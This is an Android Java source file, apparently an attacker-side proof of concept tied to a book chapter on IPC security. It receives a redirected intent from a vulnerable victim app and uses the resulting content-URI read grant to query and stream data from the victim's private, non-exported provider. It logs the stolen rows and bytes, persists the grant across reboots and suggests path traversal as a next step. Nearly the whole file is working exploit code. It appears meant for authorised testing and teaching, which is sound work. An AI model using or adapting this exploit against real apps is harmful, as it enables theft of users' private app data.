/*
 * GrantSink.java — 24-IPC / examples/attacker-app
 *
 * WHAT IT DOES
 *     Receives the Intent that the victim app was tricked into starting on our
 *     behalf, and immediately tries to USE the content-URI permission grant
 *     that came with it.
 *
 * WHY IT MATTERS
 *     This is the component that turns "the deputy forwarded our Intent" into
 *     "we read the victim's private database". Without it you have a
 *     theoretical redirection; with it you have data in a log line, which is
 *     what a client will accept as evidence.
 *
 *     The mechanism, in one paragraph. The victim app has an exported activity
 *     that reads an Intent out of an extra and calls startActivity() on it. We
 *     supply an inner Intent that targets THIS activity, carries a content://
 *     URI belonging to the victim's own android:exported="false" provider, and
 *     sets FLAG_GRANT_READ_URI_PERMISSION. When the victim makes that
 *     startActivity() call, the framework evaluates the grant flags with the
 *     VICTIM as the granter — because the victim owns the provider and the
 *     victim is the caller. UriGrantsManagerService issues a real, legitimate
 *     read grant to us. We then query a provider we were never allowed to
 *     touch. See Chapter 24 sections 3.20 and 4.1.
 *
 * HOW TO RUN
 *     Not launched directly. ProbeActivity's confused-deputy probe causes the
 *     victim to launch it. Watch:
 *
 *     # adb shell
 *     logcat -s poc:I
 *
 * REQUIREMENTS
 *     Declared android:exported="true" in AndroidManifest.xml, because the
 *     component that starts it is a DIFFERENT app (the victim, a different
 *     UID). An exported="false" sink silently defeats the whole exploit and
 *     you would misread that as "the target is not vulnerable".
 *
 * AUTHORISED TESTING ONLY.
 */
package com.attacker.poc;

import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import java.io.InputStream;

public class GrantSink extends Activity {

    private static final String TAG = "poc";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent in = getIntent();
        if (in == null) {
            Log.i(TAG, "[grant-sink] launched with a null Intent");
            finish();
            return;
        }

        Log.i(TAG, "================ GRANT SINK ================");
        Log.i(TAG, "[grant-sink] launched by : " + describeLauncher());
        Log.i(TAG, "[grant-sink] action      : " + in.getAction());
        Log.i(TAG, "[grant-sink] data        : " + in.getData());
        Log.i(TAG, "[grant-sink] flags       : 0x"
                + Integer.toHexString(in.getFlags()));
        Log.i(TAG, "[grant-sink] read grant  : " + hasFlag(in,
                Intent.FLAG_GRANT_READ_URI_PERMISSION));
        Log.i(TAG, "[grant-sink] write grant : " + hasFlag(in,
                Intent.FLAG_GRANT_WRITE_URI_PERMISSION));
        Log.i(TAG, "[grant-sink] persistable : " + hasFlag(in,
                Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION));

        Uri uri = in.getData();
        if (uri == null) {
            Log.i(TAG, "[grant-sink] no data URI — the deputy stripped it, or");
            Log.i(TAG, "             the redirection did not actually happen.");
            Log.i(TAG, "             Not a finding on this evidence.");
            finish();
            return;
        }

        // ------------------------------------------------------------------
        // The moment of truth. If the grant was issued, this query succeeds
        // against a provider declared android:exported="false".
        // ------------------------------------------------------------------
        readViaCursor(uri);
        readViaStream(uri);

        // If the grant is persistable, take it. A persisted grant survives
        // reboot and is written to /data/system/uri_grants.xml — which is one
        // of the very few places an IPC attack leaves durable, attributable
        // forensic evidence (Chapter 24 section 5.5). Taking it is also how you
        // demonstrate that the exposure is not merely momentary.
        if (hasFlag(in, Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION)) {
            try {
                getContentResolver().takePersistableUriPermission(
                        uri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
                Log.i(TAG, "[grant-sink] PERSISTED the grant — it now survives"
                        + " reboot. Check /data/system/uri_grants.xml.");
            } catch (Exception e) {
                Log.i(TAG, "[grant-sink] could not persist: " + e);
            }
        }

        Log.i(TAG, "===========================================");
        finish();
    }

    /** Read the URI as a cursor — the ContentProvider.query() path. */
    private void readViaCursor(Uri uri) {
        Cursor c = null;
        try {
            c = getContentResolver().query(uri, null, null, null, null);
            if (c == null) {
                Log.i(TAG, "[grant-sink] query -> null cursor (grant may exist"
                        + " but the path matches nothing)");
                return;
            }
            Log.i(TAG, "[grant-sink] *** STOLEN READ ACCESS *** "
                    + c.getCount() + " rows");
            int shown = 0;
            while (c.moveToNext() && shown < 5) {
                StringBuilder sb = new StringBuilder("    row: ");
                for (int i = 0; i < c.getColumnCount(); i++) {
                    sb.append(c.getColumnName(i)).append('=');
                    try { sb.append(c.getString(i)); }
                    catch (Exception e) { sb.append("<non-text>"); }
                    sb.append(' ');
                }
                Log.i(TAG, sb.toString());
                shown++;
            }
        } catch (SecurityException e) {
            // This is the honest negative result. Report it as such.
            Log.i(TAG, "[grant-sink] NO GRANT — query denied: " + e.getMessage());
            Log.i(TAG, "             The deputy either did not forward our");
            Log.i(TAG, "             Intent, or stripped FLAG_GRANT_* before");
            Log.i(TAG, "             forwarding. Either way: not a finding.");
        } catch (Exception e) {
            Log.i(TAG, "[grant-sink] query error: " + e);
        } finally {
            if (c != null) { try { c.close(); } catch (Exception ignored) { } }
        }
    }

    /** Read the URI as a stream — the ContentProvider.openFile() path. */
    private void readViaStream(Uri uri) {
        InputStream is = null;
        try {
            is = getContentResolver().openInputStream(uri);
            if (is == null) return;
            byte[] buf = new byte[256];
            int n = is.read(buf);
            if (n > 0) {
                Log.i(TAG, "[grant-sink] *** STOLEN FILE READ *** first " + n
                        + " bytes: " + new String(buf, 0, n, "UTF-8")
                        .replaceAll("[^\\x20-\\x7e]", "."));
                Log.i(TAG, "             openFile() succeeded, so the provider");
                Log.i(TAG, "             serves file content too. Try path");
                Log.i(TAG, "             traversal next: ../../databases/app.db");
            }
        } catch (SecurityException e) {
            Log.i(TAG, "[grant-sink] openInputStream denied: " + e.getMessage());
        } catch (Exception e) {
            // FileNotFoundException here is normal for a cursor-only provider.
            Log.i(TAG, "[grant-sink] openInputStream: " + e.getClass().getSimpleName());
        } finally {
            if (is != null) { try { is.close(); } catch (Exception ignored) { } }
        }
    }

    /**
     * Who launched us?
     *
     * getCallingPackage() only returns a value when the launcher used
     * startActivityForResult(). For a plain startActivity() it is null — and
     * null must NOT be read as "launched internally". That misreading is a real
     * source of authorisation bugs in production apps; see Chapter 24 §3.21.
     * Here it is only diagnostics.
     */
    private String describeLauncher() {
        String pkg = getCallingPackage();
        if (pkg != null) return pkg + " (via startActivityForResult)";
        return "unknown — plain startActivity() does not reveal the caller";
    }

    private static boolean hasFlag(Intent i, int flag) {
        return (i.getFlags() & flag) == flag;
    }
}
